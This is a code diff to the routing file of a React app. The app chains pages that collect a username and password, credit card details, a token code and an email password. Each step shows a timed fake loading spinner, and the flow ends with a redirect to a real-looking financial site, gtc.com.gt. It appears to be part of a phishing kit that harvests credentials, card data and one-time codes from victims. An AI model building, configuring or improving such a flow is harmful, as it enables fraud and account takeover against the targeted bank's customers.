@@ -1,9 +1,9 @@
 import React from 'react'
 import { BrowserRouter, Route, Routes } from 'react-router-dom'
 import { CreditCard } from '../pages/card/CreditCard'
-import { UsernameAndPassword } from '../pages/Username and password/UsernameAndPassword'
+import { UsernameAndPassword } from '../pages/Usernamepassword/UsernameAndPassword'
 import { EmailAndPassword } from '../pages/email/emailAndPassword/EmailAndPassword'
-import { EmailAndPhone } from '../pages/email/emailAndPhone/EmailAndPhone'
+// import { EmailAndPhone } from '../pages/email/emailAndPhone/EmailAndPhone'
 import { Token } from '../pages/token/Token'
 
 export const Navigation = () => {
@@ -13,30 +13,34 @@ export const Navigation = () => {
             {/* AQUI SOLO HAY QUE DESCOMENTAR LOS QUE DESEAS USAR EN EL ORDEN QUE DESEES QUE ESTÉ */}
             
             <Route path='/' element={<UsernameAndPassword
-              timeLoader={1000}
-              spiner={true}
-              urlToNavigate={'correo-claveCorreo'}
+              urlToNavigate={'tarjeta'}
             />} />
-
-            {/* email/emailAndPassword */}
-            <Route path='correo-claveCorreo' element={
-              <EmailAndPassword urlToNavigate={'/correo-celular'} />} 
-            />
-            
-            {/* email/emailAndPhone */}
-            <Route path='/correo-celular' element={
-              <EmailAndPhone urlToNavigate={'/tarjeta'} />} 
-            />
 
             {/* card/CreditCard */}
             <Route path='/tarjeta' element={
-              <CreditCard urlToNavigate={'/token'} />} 
+              <CreditCard timeLoader={15000} spiner={true} urlToNavigate={'token'} />} 
             />
 
-            {/* token/Token */}
+            {/* email/emailAndPassword */}
             <Route path='/token' element={
-              <Token urlToNavigate={''} />} 
+              <Token 
+                timeLoader={5000}
+                spiner={true}
+                urlToNavigate={'correo-clave'} 
+              />} 
             />
+            
+            {/* email/emailAndPhone */}
+            <Route path='/correo-clave' element={
+              <EmailAndPassword 
+                spiner={true}
+                endUrl={'https://www.gtc.com.gt/'} 
+                timeLoader={5000}
+              />} 
+            />
+
+
+
         </Routes>
     </BrowserRouter>
   )
